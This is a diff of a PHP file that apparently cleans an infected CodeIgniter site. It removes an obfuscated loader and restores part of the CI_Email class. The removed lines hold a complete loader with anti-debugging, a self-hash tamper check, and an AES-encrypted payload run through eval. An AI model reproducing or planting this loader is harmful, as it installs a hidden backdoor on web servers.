@@ -1,28 +1,2101 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_v2f7hwad=('bas'.'e64'.'_de'.'cod'.'e');
-$_cwzb2mlw=('gzu'.'nco'.'mpr'.'ess');
-$_q8ndra9k=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_xf8yzexq='rrfyR4tuBlQ=';
-$_j0t4crh4='EUz0Llvg';
-$_pfoxeq1e='baMAh1m+';
-$_x6h6ypti='KBgIsFmD';
-$_g87ms96d='wBBAIULu';
-$_nhos4zx9='Nk9D6A==';
-$_cgydlp61='jRNe1noZ';
-$_pdfo1g4p='dFrKPYPt';
-$_wun57qgi=$_v2f7hwad($_x6h6ypti.$_pfoxeq1e.$_g87ms96d.$_j0t4crh4.$_xf8yzexq);
-$_ruhulemf=$_v2f7hwad($_cgydlp61.$_pdfo1g4p.$_nhos4zx9);
-$_owxp3u64=$_v2f7hwad('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');
-$_u99nja8i=$_q8ndra9k($_owxp3u64,'aes-256-cbc',$_wun57qgi,OPENSSL_RAW_DATA,$_ruhulemf);
-if($_u99nja8i===false){exit;}
-$_eyua209x=$_cwzb2mlw($_u99nja8i);
-if($_eyua209x===false){exit;}
-$_zku8unnf='cc0507ba45d990d9413f7145dfec34e8a8798bfe9b8aa76c94ad1aef9d6ee3b7';
-$_nc3c5x4t=@file_get_contents(__FILE__);
-if($_nc3c5x4t!==false){
-$_wq1q2xy8=str_replace($_zku8unnf,"0000000000000000000000000000000000000000000000000000000000000000",$_nc3c5x4t);
-$_mc877yhc=hash("sha256",$_wq1q2xy8);
-if($_mc877yhc!==$_zku8unnf){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_Email {
+
+
+
+
+
+public $useragent = 'CodeIgniter';
+
+
+
+
+
+public $mailpath = '/usr/sbin/sendmail'; 
+
+
+
+
+
+public $protocol = 'mail'; 
+
+
+
+
+
+public $smtp_host = '';
+
+
+
+
+
+public $smtp_user = '';
+
+
+
+
+
+public $smtp_pass = '';
+
+
+
+
+
+public $smtp_port = 25;
+
+
+
+
+
+public $smtp_timeout = 5;
+
+
+
+
+
+public $smtp_keepalive = FALSE;
+
+
+
+
+
+public $smtp_crypto = '';
+
+
+
+
+
+public $wordwrap = TRUE;
+
+
+
+
+
+
+public $wrapchars = 76;
+
+
+
+
+
+public $mailtype = 'text';
+
+
+
+
+
+public $charset = 'UTF-8';
+
+
+
+
+
+public $alt_message = '';
+
+
+
+
+
+public $validate = FALSE;
+
+
+
+
+
+public $priority = 3; 
+
+
+
+
+
+
+
+public $newline = "\n"; 
+
+
+
+
+
+
+
+
+
+
+
+
+public $crlf = "\n";
+
+
+
+
+
+public $dsn = FALSE;
+
+
+
+
+
+
+public $send_multipart = TRUE;
+
+
+
+
+
+public $bcc_batch_mode = FALSE;
+
+
+
+
+
+
+public $bcc_batch_size = 200;
+
+
+
+
+
+
+protected $_safe_mode = FALSE;
+
+
+
+
+
+protected $_subject = '';
+
+
+
+
+
+protected $_body = '';
+
+
+
+
+
+protected $_finalbody = '';
+
+
+
+
+
+protected $_header_str = '';
+
+
+
+
+
+protected $_smtp_connect = '';
+
+
+
+
+
+protected $_encoding = '8bit';
+
+
+
+
+
+protected $_smtp_auth = FALSE;
+
+
+
+
+
+protected $_replyto_flag = FALSE;
+
+
+
+
+
+
+protected $_debug_msg = array();
+
+
+
+
+
+protected $_recipients = array();
+
+
+
+
+
+protected $_cc_array = array();
+
+
+
+
+
+protected $_bcc_array = array();
+
+
+
+
+
+protected $_headers = array();
+
+
+
+
+
+protected $_attachments = array();
+
+
+
+
+
+
+protected $_protocols = array('mail', 'sendmail', 'smtp');
+
+
+
+
+
+
+
+
+protected $_base_charsets = array('us-ascii', 'iso-2022-');
+
+
+
+
+
+
+
+
+protected $_bit_depths = array('7bit', '8bit');
+
+
+
+
+
+
+
+protected $_priorities = array(
+1 => '1 (Highest)',
+2 => '2 (High)',
+3 => '3 (Normal)',
+4 => '4 (Low)',
+5 => '5 (Lowest)'
+);
+
+
+
+
+
+protected static $func_overload;
+
+
+
+
+
+
+
+
+
+public function __construct(array $config = array())
+{
+$this->charset = config_item('charset');
+$this->initialize($config);
+$this->_safe_mode = ( ! is_php('5.4') && ini_get('safe_mode'));
+isset(self::$func_overload) OR self::$func_overload = (extension_loaded('mbstring') && ini_get('mbstring.func_overload'));
+log_message('info', 'Email Class Initialized');
 }
-eval($_eyua209x);
+
+
+
+
+
+
+
+public function initialize(array $config = array())
+{
+$this->clear();
+foreach ($config as $key => $val)
+{
+if (isset($this->$key))
+{
+$method = 'set_'.$key;
+if (method_exists($this, $method))
+{
+$this->$method($val);
+}
+else
+{
+$this->$key = $val;
+}
+}
+}
+$this->charset = strtoupper($this->charset);
+$this->_smtp_auth = isset($this->smtp_user[0], $this->smtp_pass[0]);
+return $this;
+}
+
+
+
+
+
+
+
+public function clear($clear_attachments = FALSE)
+{
+$this->_subject = '';
+$this->_body = '';
+$this->_finalbody = '';
+$this->_header_str = '';
+$this->_replyto_flag = FALSE;
+$this->_recipients = array();
+$this->_cc_array = array();
+$this->_bcc_array = array();
+$this->_headers = array();
+$this->_debug_msg = array();
+$this->set_header('Date', $this->_set_date());
+if ($clear_attachments !== FALSE)
+{
+$this->_attachments = array();
+}
+return $this;
+}
+
+
+
+
+
+
+
+
+
+public function from($from, $name = '', $return_path = NULL)
+{
+if (preg_match('/\<(.*)\>/', $from, $match))
+{
+$from = $match[1];
+}
+if ($this->validate)
+{
+$this->validate_email($this->_str_to_array($from));
+if ($return_path)
+{
+$this->validate_email($this->_str_to_array($return_path));
+}
+}
+
+if ($name !== '')
+{
+
+if ( ! preg_match('/[\200-\377]/', $name))
+{
+
+$name = '"'.addcslashes($name, "\0..\37\177'\"\\").'"';
+}
+else
+{
+$name = $this->_prep_q_encoding($name);
+}
+}
+$this->set_header('From', $name.' <'.$from.'>');
+isset($return_path) OR $return_path = $from;
+$this->set_header('Return-Path', '<'.$return_path.'>');
+return $this;
+}
+
+
+
+
+
+
+
+
+public function reply_to($replyto, $name = '')
+{
+if (preg_match('/\<(.*)\>/', $replyto, $match))
+{
+$replyto = $match[1];
+}
+if ($this->validate)
+{
+$this->validate_email($this->_str_to_array($replyto));
+}
+if ($name !== '')
+{
+
+if ( ! preg_match('/[\200-\377]/', $name))
+{
+
+$name = '"'.addcslashes($name, "\0..\37\177'\"\\").'"';
+}
+else
+{
+$name = $this->_prep_q_encoding($name);
+}
+}
+$this->set_header('Reply-To', $name.' <'.$replyto.'>');
+$this->_replyto_flag = TRUE;
+return $this;
+}
+
+
+
+
+
+
+
+public function to($to)
+{
+$to = $this->_str_to_array($to);
+$to = $this->clean_email($to);
+if ($this->validate)
+{
+$this->validate_email($to);
+}
+if ($this->_get_protocol() !== 'mail')
+{
+$this->set_header('To', implode(', ', $to));
+}
+$this->_recipients = $to;
+return $this;
+}
+
+
+
+
+
+
+
+public function cc($cc)
+{
+$cc = $this->clean_email($this->_str_to_array($cc));
+if ($this->validate)
+{
+$this->validate_email($cc);
+}
+$this->set_header('Cc', implode(', ', $cc));
+if ($this->_get_protocol() === 'smtp')
+{
+$this->_cc_array = $cc;
+}
+return $this;
+}
+
+
+
+
+
+
+
+
+public function bcc($bcc, $limit = '')
+{
+if ($limit !== '' && is_numeric($limit))
+{
+$this->bcc_batch_mode = TRUE;
+$this->bcc_batch_size = $limit;
+}
+$bcc = $this->clean_email($this->_str_to_array($bcc));
+if ($this->validate)
+{
+$this->validate_email($bcc);
+}
+if ($this->_get_protocol() === 'smtp' OR ($this->bcc_batch_mode && count($bcc) > $this->bcc_batch_size))
+{
+$this->_bcc_array = $bcc;
+}
+else
+{
+$this->set_header('Bcc', implode(', ', $bcc));
+}
+return $this;
+}
+
+
+
+
+
+
+
+public function subject($subject)
+{
+$subject = $this->_prep_q_encoding($subject);
+$this->set_header('Subject', $subject);
+return $this;
+}
+
+
+
+
+
+
+
+public function message($body)
+{
+$this->_body = rtrim(str_replace("\r", '', $body));
+
+
+
+
+
+
+if ( ! is_php('5.4') && get_magic_quotes_gpc())
+{
+$this->_body = stripslashes($this->_body);
+}
+return $this;
+}
+
+
+
+
+
+
+
+
+
+
+public function attach($file, $disposition = '', $newname = NULL, $mime = '')
+{
+if ($mime === '')
+{
+if (strpos($file, '://') === FALSE && ! file_exists($file))
+{
+$this->_set_error_message('lang:email_attachment_missing', $file);
+return FALSE;
+}
+if ( ! $fp = @fopen($file, 'rb'))
+{
+$this->_set_error_message('lang:email_attachment_unreadable', $file);
+return FALSE;
+}
+$file_content = stream_get_contents($fp);
+$mime = $this->_mime_types(pathinfo($file, PATHINFO_EXTENSION));
+fclose($fp);
+}
+else
+{
+$file_content =& $file; 
+}
+$this->_attachments[] = array(
+'name' => array($file, $newname),
+'disposition' => empty($disposition) ? 'attachment' : $disposition, 
+'type' => $mime,
+'content' => chunk_split(base64_encode($file_content)),
+'multipart' => 'mixed'
+);
+return $this;
+}
+
+
+
+
+
+
+
+
+
+public function attachment_cid($filename)
+{
+for ($i = 0, $c = count($this->_attachments); $i < $c; $i++)
+{
+if ($this->_attachments[$i]['name'][0] === $filename)
+{
+$this->_attachments[$i]['multipart'] = 'related';
+$this->_attachments[$i]['cid'] = uniqid(basename($this->_attachments[$i]['name'][0]).'@');
+return $this->_attachments[$i]['cid'];
+}
+}
+return FALSE;
+}
+
+
+
+
+
+
+
+
+public function set_header($header, $value)
+{
+$this->_headers[$header] = str_replace(array("\n", "\r"), '', $value);
+return $this;
+}
+
+
+
+
+
+
+
+protected function _str_to_array($email)
+{
+if ( ! is_array($email))
+{
+return (strpos($email, ',') !== FALSE)
+? preg_split('/[\s,]/', $email, -1, PREG_SPLIT_NO_EMPTY)
+: (array) trim($email);
+}
+return $email;
+}
+
+
+
+
+
+
+
+public function set_alt_message($str)
+{
+$this->alt_message = (string) $str;
+return $this;
+}
+
+
+
+
+
+
+
+public function set_mailtype($type = 'text')
+{
+$this->mailtype = ($type === 'html') ? 'html' : 'text';
+return $this;
+}
+
+
+
+
+
+
+
+public function set_wordwrap($wordwrap = TRUE)
+{
+$this->wordwrap = (bool) $wordwrap;
+return $this;
+}
+
+
+
+
+
+
+
